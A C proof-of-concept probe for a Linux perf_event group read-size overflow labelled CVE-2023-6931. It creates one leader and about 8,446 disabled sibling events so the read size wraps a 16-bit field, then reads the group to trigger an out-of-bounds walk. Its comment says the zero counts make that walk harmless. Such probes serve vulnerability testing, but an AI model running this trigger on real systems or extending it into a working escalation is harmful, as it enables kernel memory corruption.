/*
 * Perf group read-size wrap probe (CVE-2023-6931 primitive, zero delta).
 * Creates one leader + N siblings, all disabled, then reads the group once.
 * With read_format=GROUP and N = 8446, read_size = 16 + 8N = 67584 -> u16 2048.
 * All counts are zero, so the OOB walk writes back the same values.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
#define PERF_TYPE_SOFTWARE 1
#define PERF_COUNT_SW_CPU_CLOCK 0
#define PERF_FORMAT_GROUP (1ULL << 3)

struct attr_min {
    uint32_t type, size;
    uint64_t config, sample_period, sample_type, read_format, flags;
    uint32_t wakeup_events, bp_type;
    uint64_t bp_addr, bp_len;
    uint64_t branch_sample_type, sample_regs_user;
    uint32_t sample_stack_user;
    int32_t clockid;
    uint64_t sample_regs_intr;
    uint32_t aux_watermark;
    uint16_t sample_max_stack, reserved2;
    uint32_t aux_sample_size, reserved3;
};

static int ev_open(uint64_t read_format, int group_fd, int disabled) {
    struct attr_min a;
    memset(&a, 0, sizeof(a));
    a.type = PERF_TYPE_SOFTWARE;
    a.size = 112;
    a.config = PERF_COUNT_SW_CPU_CLOCK;
    a.read_format = read_format;
    a.flags = disabled ? 1ULL : 0ULL;
    return (int)syscall(__NR_perf_event_open, &a, 0, -1, group_fd, 0);
}

int main(int argc, char **argv) {
    int n = argc > 1 ? atoi(argv[1]) : 8446;
    struct rlimit rl = {20000, 20000};
    setrlimit(RLIMIT_NOFILE, &rl);
    int leader = ev_open(PERF_FORMAT_GROUP, -1, 1);
    if (leader < 0) {
        printf("leader: %s\n", strerror(errno));
        return 1;
    }
    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    int made = 0;
    for (int i = 0; i < n; i++) {
        int fd = ev_open(0, leader, 1);
        if (fd < 0) {
            printf("sibling %d: %s\n", i, strerror(errno));
            break;
        }
        made++;
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    printf("siblings=%d (%.1fs)\n", made,
           (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9);
    static char buf[8192];
    errno = 0;
    ssize_t r = read(leader, buf, sizeof(buf));
    printf("read=%zd errno=%d (%s) first_u64=%llu\n", r, errno, strerror(errno),
           (unsigned long long)*(uint64_t *)buf);
    return 0;
}
